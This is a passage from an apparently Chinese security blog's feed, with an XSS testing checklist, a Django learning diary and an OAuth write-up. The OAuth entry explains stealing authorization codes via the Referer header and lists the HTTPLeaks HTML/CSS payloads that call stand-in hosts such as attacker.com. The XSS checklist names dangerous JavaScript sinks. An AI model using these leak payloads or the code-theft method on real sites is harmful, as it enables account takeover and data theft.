class="hljs-string">.图片类型可结合登录跳转携带用户敏感信息进行利用，通过referer将信息发送至自己服务器</span><span class="hljs-number">5.</span><span class="hljs-string">bbcode语法，某些富文本编辑框支持的语法，如[img]https://baidu.com[/img]</span>﻿﻿<span class="hljs-number">4.</span><span class="hljs-string">jsonp</span><span class="hljs-number">1</span><span class="hljs-string">.出现位置：</span><span class="hljs-string">网页发送的请求中</span><span class="hljs-string">常用参数：callback,</span> <span class="hljs-string">cb...</span><span class="hljs-string">漏洞情况：</span><span class="hljs-number">1</span><span class="hljs-string">.用户敏感信息泄露</span><span class="hljs-number">2.</span><span class="hljs-string">xss</span><span class="hljs-string">...</span>﻿﻿<span class="hljs-number">5</span><span class="hljs-string">.内容审计</span><span class="hljs-number">1.</span><span class="hljs-string">url与html属性</span> <span class="hljs-string">url参数，路径，html不同属性的作用...</span><span class="hljs-number">2.</span><span class="hljs-string">JS代码审计与隐藏参数</span><span class="hljs-string">审计常见危险方法名：</span><span class="hljs-string">Plain</span> <span class="hljs-string">Text</span><span class="hljs-string">innerHTML</span><span class="hljs-string">appendChild()</span><span class="hljs-string">html()</span><span class="hljs-string">replaceWith()</span><span class="hljs-string">location.hash</span><span class="hljs-string">location.search()</span><span class="hljs-string">localStorage</span><span class="hljs-string">setTimeout()</span><span class="hljs-string">eval()</span><span class="hljs-string">隐藏参数</span><span class="hljs-string">url中自动产生的参数</span><span class="hljs-string">input标签hidden属性</span><span class="hljs-string">js代码中的隐藏参数</span><span class="hljs-string">其他相关业务中使用到的参数</span><span class="hljs-string">隐藏路径：id，请求</span><span class="hljs-string">a标签的href，带注释的a标签</span><span class="hljs-string">form的action提交地址</span><span class="hljs-string">script标签内的路径</span><span class="hljs-string">path搜索，https://,</span> <span class="hljs-string">/</span><span class="hljs-string">请求地址，参数，响应值</span>﻿﻿<span class="hljs-number">6</span><span class="hljs-string">.工具的使用</span><span class="hljs-number">1.</span><span class="hljs-string">Awvs</span><span class="hljs-string">测试前主动扫描网站，分析报告，针对报告中有风险的位置多次尝试复现（若无法复现，此处可能为误报）</span><span class="hljs-number">2.</span><span class="hljs-string">Xray</span><span class="hljs-string">对具体位置，请求进行精准扫描，分析报告，尝试复现报告，（xss误报较少，sql注入误报较多）</span><span class="hljs-number">3.</span><span class="hljs-string">JSPrime</span><span class="hljs-string">对站点进行深度审计时可用于分析站点js代码执行顺序，审计domxss</span>﻿﻿<span class="hljs-number">7</span><span class="hljs-string">.学习提升</span><span class="hljs-number">1</span><span class="hljs-string">.多看漏洞案例及公开漏洞报告</span><span class="hljs-number">2</span><span class="hljs-string">.对漏洞可尝试进行复现，加深印象</span><span class="hljs-number">3</span><span class="hljs-string">.多注重思路的培养，寻去自己独特的测试流程</span><span class="hljs-number">4</span><span class="hljs-string">.多吸收国内外的漏洞文章经验及思路</span><span class="hljs-number">5</span><span class="hljs-string">.对通用漏洞或系统在遇见前先查询改系统的公开通用漏洞</span><span class="hljs-number">6</span><span class="hljs-string">.对好的知识点或内容进行收集整理</span><span class="hljs-string">http://www.58q8.com/web/hkdh/</span>   <span class="hljs-string">安全网站导航</span><span class="hljs-string">https://www.exploit-db.com/google-hacking-database</span>   <span class="hljs-string">Google</span> <span class="hljs-string">hack</span> <span class="hljs-string">资料库</span><span class="hljs-string">http://www.cnnvd.org.cn/</span>  <span class="hljs-string">安全信息库</span><span class="hljs-string">http://whatweb.bugscaner.com/look/</span>  <span class="hljs-string">cms查询</span><span class="hljs-string">http://tools.bugscaner.com/subdomain/</span> <span class="hljs-string">子域名</span><span class="hljs-string">https://site.ip138.com/myoas.com/domain.htm</span> <span class="hljs-string">ip</span><span class="hljs-string">https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet</span> <span class="hljs-string">xss</span> <span class="hljs-string">bypass</span><span class="hljs-string">http://kumamon.fun/MyBB-RCE/</span> <span class="hljs-string">bbcode嵌套</span><span class="hljs-string">https://www.freebuf.com/articles/web/81959.html</span> <span class="hljs-string">常见waf绕过</span><span class="hljs-string">https://html5sec.org/</span> <span class="hljs-string">h5security</span><span class="hljs-string">https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>xss</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>django_learn</title>
    <link href="/2020/06/16/django-learn/"/>
    <url>/2020/06/16/django-learn/</url>
    
    <content type="html"><![CDATA[<h1 id="django开发"><a href="#django开发" class="headerlink" title="django开发"></a>django开发</h1><blockquote><p>开发能力太弱了，学学django的开发….</p></blockquote><h2 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h2><p>生成虚拟环境，在其中的环境配置不会影响主配置</p><h4 id="vitualenv"><a href="#vitualenv" class="headerlink" title="vitualenv"></a><strong>vitualenv</strong></h4><pre><code class="hljs python">pip install virtualenvvirtualenv my_env//生成虚拟目录source my_env/bin/activate//激活环境source my_env/bin/deactivate//禁用</code></pre><h4 id="Django"><a href="#Django" class="headerlink" title="Django"></a><strong>Django</strong></h4><pre><code class="hljs angelscript">pip install Django === <span class="hljs-number">2.0</span><span class="hljs-number">.5</span>django-admin startproject d3vil_pylearn<span class="hljs-comment">//生成项目</span>python manage.py migrate<span class="hljs-comment">//生成对应数据表</span>python manage.py runserver</code></pre><blockquote><p>__init_文件，将该目录视为一个模块</p><p>_setting.py,项目设置</p><p>_urls.py,项目路由</p><p>_wsgi.py,服务器网关接口运行项目</p></blockquote><p>到此就创建了django的框架，接下来我们要在此框架上进行功能的完善。</p><pre><code class="hljs vim"><span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> startapp blog</code></pre><blockquote><p>admin.py            注册模型</p><p>apps.py                主要配置</p><p>migrations            数据库迁移，跟踪模块变化，同步数据库</p><p>models.py            数据模型</p><p>tests.py                    测试</p><p>views.py                接收请求，响应视图</p></blockquote><p>初步了解django后，发现其mvc思想随处可见，setting.py里面包含了需要的配置文件，在migrate时主要针对此中的app进行数据库表的配置，而每一个app中又有个model来进行数据模型的定义，均用一个model类的子类来进行定义，封装了一些诸如datetimeField，CharField等的数据结构定义。view来进行显示</p><p><img src="/img/app/1.png" srcset="/img/loading.gif" alt=""></p><p>在进行完model的数据模型设计后，我们将这个app引入到我们的项目设置中来再</p><pre><code class="hljs sqlite">python manage.py makemigrations polls就可以完成数据表建立python manage.py sqlmigrate polls 0001不对，只是生成了对应的migration文件，现在这个是搞对应的sql语句看来django通过这个来实现可移植性BEGIN;---- Create model Choice--CREATE TABLE &quot;polls_choice&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;choice_text&quot; varchar(200) NOT NULL, &quot;votes&quot; integer NOT NULL);---- Create model Question--CREATE TABLE &quot;polls_question&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;question_text&quot; varchar(200) NOT NULL, &quot;pub_date&quot; datetime NOT NULL);---- Add field question to choice--ALTER TABLE &quot;polls_choice&quot; RENAME TO &quot;polls_choice__old&quot;;CREATE TABLE &quot;polls_choice&quot; (&quot;id&quot; integer NOT NULL PRIMARY KEY AUTOINCREMENT, &quot;choice_text&quot; varchar(200) NOT NULL, &quot;votes&quot; integer NOT NULL, &quot;question_id&quot; integer NOT NULL REFERENCES &quot;polls_question&quot; (&quot;id&quot;) DEFERRABLE INITIALLY DEFERRED);INSERT INTO &quot;polls_choice&quot; (&quot;id&quot;, &quot;choice_text&quot;, &quot;votes&quot;, &quot;question_id&quot;) SELECT &quot;id&quot;, &quot;choice_text&quot;, &quot;votes&quot;, NULL FROM &quot;polls_choice__old&quot;;DROP TABLE &quot;polls_choice__old&quot;;CREATE INDEX &quot;polls_choice_question_id_c5b4b260&quot; ON &quot;polls_choice&quot; (&quot;question_id&quot;);COMMIT;</code></pre><p>Then execute migrate to execute sql.</p><p>然后是数据库的操作</p><pre><code class="hljs routeros">在建立好数据库后，查询操作如下<span class="hljs-keyword">from</span> polls.models import Choice, Question引入类Question.objects.all()查询类比于select * <span class="hljs-keyword">from</span> 表QUEStionQuestion.objects.filter(<span class="hljs-attribute">id</span>=1)select * <span class="hljs-keyword">from</span> Question where <span class="hljs-attribute">id</span>=1Question.objects.filter(<span class="hljs-attribute">question_text__startswith</span>=<span class="hljs-string">'What'</span>)Question.objects.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">pub_date__year</span>=current_year)注意get和filter方法不同，get能把对象取出来然后才能调用这个方法因为关系数据的原因，choice里的question是Question的外键，接下来迷惑操作警告q.choice_set.all()查询Question对象的choice对象q.choice_set.create(<span class="hljs-attribute">choice_text</span>=<span class="hljs-string">'Not much'</span>, <span class="hljs-attribute">votes</span>=0)设置一个c = q.choice_set.create(<span class="hljs-attribute">choice_text</span>=<span class="hljs-string">'Just hacking again'</span>, <span class="hljs-attribute">votes</span>=0)c是一个choice对象确可以调用related objects，可能是用的子类实现外键？&gt;&gt;&gt; c.question&lt;Question: What<span class="hljs-string">'s up?&gt;</span><span class="hljs-string">&gt;&gt;&gt; q.choice_set.all()</span><span class="hljs-string">&lt;QuerySet [&lt;Choice: Not much&gt;, &lt;Choice: The sky&gt;, &lt;Choice: Just hacking again&gt;]&gt;</span><span class="hljs-string">c.delete()就可以</span></code></pre><h4 id="创造管理员"><a href="#创造管理员" class="headerlink" title="创造管理员"></a>创造管理员</h4><pre><code class="hljs vim">$ <span class="hljs-keyword">python</span> manage.<span class="hljs-keyword">py</span> createsuperuser</code></pre><p><img src="/img/app/2.png" srcset="/img/loading.gif" alt=""></p><p>但我们的admin管理页面里还没有我们的polls数据，</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> admin<span class="hljs-comment"># Register your models here.</span><span class="hljs-keyword">from</span> .models <span class="hljs-keyword">import</span> Questionadmin.site.register(Question)</code></pre><p>这样在admin.py里注册我们的模型，就可以在后台中进行管理</p><p>踩了个坑，显示旧表不存在，更新了下django，3.10就可以了</p><p>嗯，今天就这样，明天开始对这个投票程序的view进行创建</p><blockquote><p>​    总结下，今天开始了django的学习，这个框架非常的灵活，且mvc的思想随处可见，项目的配置文件主要由setting.py进行配置，应用了哪个app，而对应的数据模型在各个app的model里进行设计修改，会先对model进行生成迁移的操作，我们也可以在执行前看到sql语句，总的操作均通过migrate来操作。然后也是数据表的操作靠model里面的数据对象类来实现，对象之间可以用外键建立联系，子类执行父类方法。然后是管理员界面可对数据进行直接操作。</p></blockquote><h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><p>今天开始视图部分的学习，估了一天，昨天去挖asrc了，这两天学了xss不少，原来以为htmlspecialchar之后就无解了，原来一个实体化就饶过了….每天亿点点学习….</p><p>​    好回归正题。</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">detail</span><span class="hljs-params">(request, question_id)</span>:</span>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">"You're looking at question %s."</span> % question_id)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">results</span><span class="hljs-params">(request, question_id)</span>:</span>    response = <span class="hljs-string">"You're looking at the results of question %s."</span>    <span class="hljs-keyword">return</span> HttpResponse(response % question_id)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vote</span><span class="hljs-params">(request, question_id)</span>:</span>    <span class="hljs-keyword">return</span> HttpResponse(<span class="hljs-string">"You're voting on question %s."</span> % question_id)</code></pre><p>首先在view.py里创造不同的路由函数</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> path<span class="hljs-keyword">from</span> . <span class="hljs-keyword">import</span> viewsurlpatterns = [    <span class="hljs-comment"># ex: /polls/</span>    path(<span class="hljs-string">''</span>, views.index, name=<span class="hljs-string">'index'</span>),    <span class="hljs-comment"># ex: /polls/5/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/'</span>, views.detail, name=<span class="hljs-string">'detail'</span>),    <span class="hljs-comment"># ex: /polls/5/results/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/results/'</span>, views.results, name=<span class="hljs-string">'results'</span>),    <span class="hljs-comment"># ex: /polls/5/vote/</span>    path(<span class="hljs-string">'&lt;int:question_id&gt;/vote/'</span>, views.vote, name=<span class="hljs-string">'vote'</span>),]</code></pre><p>在url.py中加入我们的路由</p><p><img src="/img/app/3.png" srcset="/img/loading.gif" alt=""></p><p>只要我们的url对应了url.py里面的参数，就会去调用对应的函数处理相应的请求，同理访问/polls/5/results/就会调用results函数。</p><p>试下xss？emmm，是int型的，不得行</p><p><img src="/img/app/4.png" srcset="/img/loading.gif" alt=""></p><p>嗯，把对应接口改成str后就可以x了，不会真有菜鸟开发员这样写吧？不会吧不会吧。</p><p>有了视图后，怎么更方便更好看呢？？</p><p>模板。</p><pre><code class="hljs django"><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> latest_question_list %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> question <span class="hljs-keyword">in</span> latest_question_list %&#125;</span><span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/polls/</span></span></span><span class="hljs-template-variable">&#123;&#123; question.id &#125;&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">/"</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; question.question_text &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><span class="xml">    </span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">else</span></span> %&#125;</span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>No polls are available.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span></code></pre><p>emmm,试了下放在text那里咋不行馁…..</p><p>嗯，睡了睡了。。。mmp最后这个模型是懵逼的慢慢做两个应用吧。。。</p><p>明天开始做blog app</p><h4 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h4>]]></content>
    
    
    
    <tags>
      
      <tag>develop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>账户权限认证</title>
    <link href="/2020/06/14/http_leek/"/>
    <url>/2020/06/14/http_leek/</url>
    
    <content type="html"><![CDATA[<h2 id="账户安全权限管理"><a href="#账户安全权限管理" class="headerlink" title="账户安全权限管理"></a>账户安全权限管理</h2><h3 id="Oauth"><a href="#Oauth" class="headerlink" title="Oauth"></a>Oauth</h3><blockquote><p>随着各类web应用层出不穷，为了让权限管理和访问控制更方便，引入了oauth体系，我们在访问应用时可以通过第三方应用授权来登录，如微信支付宝登录。</p></blockquote><pre><code class="hljs angelscript">用户点击登录 <span class="hljs-comment">//</span> 告诉login页面我要用第三方平台上你 然后这个login页面就会回答你： 好的你去跟老大哥说下吧，你要告诉这个地址三件事： <span class="hljs-number">1.</span>是我让你来的 client_id  <span class="hljs-number">2.</span>用code授权模式  <span class="hljs-number">3.</span>redirect_url 是你最终要访问的应用</code></pre><p><img src="/img/bug/1.png" srcset="/img/loading.gif" alt=""></p><p>在登陆页面，当你扫码的时候其实是来到了open.weixin.qq.com这个域名来进行oauth认证</p><p>我们扫码，他就会访问这个连接，然后用burp拦截包看看</p><p><img src="/img/bug/2.png" srcset="/img/loading.gif" alt=""></p><p>首先会发一个向微信的连接请求，带有uuid(前面说的client_id)，因为是小程序所以没有redirect_url？？？</p><p>现在已经告诉这个第三方平台你的目的了，然后他会告诉你让你去登录</p><p>反映在微信界面上就是，有小程序登录，请问你是否准许（因为微信已经登录，所以不需要第三方登录这一环节。细化来看，这一步应该还有去登录界面登录，并告诉他你是从oauth界面来的，你登陆后要跳转过去。并用你登录的token向oauth页面要你的code）</p><p>点击确认后，就会拿到一个code</p><p><img src="/img/bug/3.png" srcset="/img/loading.gif" alt=""></p><p>然后用这个code去请求你的redirect_url就是前面说的最终要访问的应用</p><p><img src="4.png" srcset="/img/loading.gif" alt=""></p><p>这个dweb2/load?code=<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p><p>就会去访问他的api，并且在这个时候微信服务器和知识星球服务器之间就会通信</p><p>知识星球：欸老哥，这个code是你批的吗？</p><p>微信：废批话，这就是老子批的</p><p>知识星球：哦哦哦，好的哥！我这就授权</p><p>然后api就会给你授权的cookie你就有权限了</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>当然，只要是应用，就可以利用，哇咔咔</p><p>我们前文已经说了，最终的应用是由redirect_url决定的，尽管有同源限制，但搞安全的人啥时候怕过限制？？</p><p><strong>想想咋个在域内把数据拿出来</strong></p><p>我们尝试在不跨域的情况下访问域内文件，是可以的。<em>大但想象，这有啥用？？</em></p><p>万一这个域内有个文件，里面有个图片是我们恶意服务器上的文件，或者有个src指向我们的服务器，那么</p><p>在我们redirect回来到这个页面的时候，他就会去访问我们的恶意服务器，并在referer头里带上刚才我们的这个code，应为这个code是放在url里的。</p><p><img src="/img/bug/5.png" srcset="/img/loading.gif" alt=""></p><p>哇咔咔</p><p>咱们的服务器就能通过这个拿到code！然后用这个code去访问授权界面拿到别的用户的权限！！！</p><p>还有………</p><blockquote><p>​    安全的问题在于权限的问题，信任的问题，以前我总是想，谁都在搞漏洞挖掘，那有一天洞挖完了咱是不是就没饭吃了啊。。。。现在想想，的确，随着安全研究的加深，以前的传统型漏洞防御会越来越多，waf会越来越变态。但漏洞绝对不会越来越少，而是会随着安全博弈的加剧，而越来越多，会随着更多的应用，更多的协议而越来越多。安全不是研究技巧的学科而是研究艺术的学科，而且我认为随着厂商的重视，这个圈子的生态会越来越好</p></blockquote><pre><code class="hljs vbnet">Security <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a tech,it<span class="hljs-comment">'s an art.</span></code></pre><h3 id="Http-Leek"><a href="#Http-Leek" class="headerlink" title="Http-Leek"></a>Http-Leek</h3><pre><code class="hljs xml">https://github.com/cure53/HTTPLeaks/blob/master/leak.html<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">    <span class="hljs-keyword">@import</span> <span class="hljs-string">'https://leaking.via/css-import-string'</span>;</span><span class="css">    <span class="hljs-keyword">@import</span> url(<span class="hljs-attribute">https:</span>//leaking.via/css-import-url);</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">&#123;<span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(http://attacker.com/x)&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">feImage</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">"https://leaking.via/svg-feimage"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"alternate stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-alternate-stylesheet"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/1999/xhtml"</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">"https://leaking.via/html-manifest"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">profile</span>=<span class="hljs-string">"https://leaking.via/head-profile"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-stylesheet"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-icon"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"canonical"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-canonical"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"shortcut icon"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-shortcut-icon"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"import"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-import"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"dns-prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-dns-prefetch"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preconnect"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preconnect"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prefetch"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-prefetch"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"prerender"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-prerender"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"font"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-font"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"image"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-image"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"image"</span> <span class="hljs-attr">imagesrcset</span>=<span class="hljs-string">",,,,,https://leaking.via/link-preload-imagesrcset"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"style"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-style"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"preload"</span> <span class="hljs-attr">as</span>=<span class="hljs-string">"script"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-preload-as-script"</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"search"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://leaking.via/link-search"</span> /&gt;</span></code></pre><p>其中</p><pre><code class="hljs">&lt;style&gt;&#123;background:url(http://attacker.com/x)&#125;&lt;/style&gt;</code></pre><p>这个就是Sm1le师傅说的css选择器窃取数据的方法</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
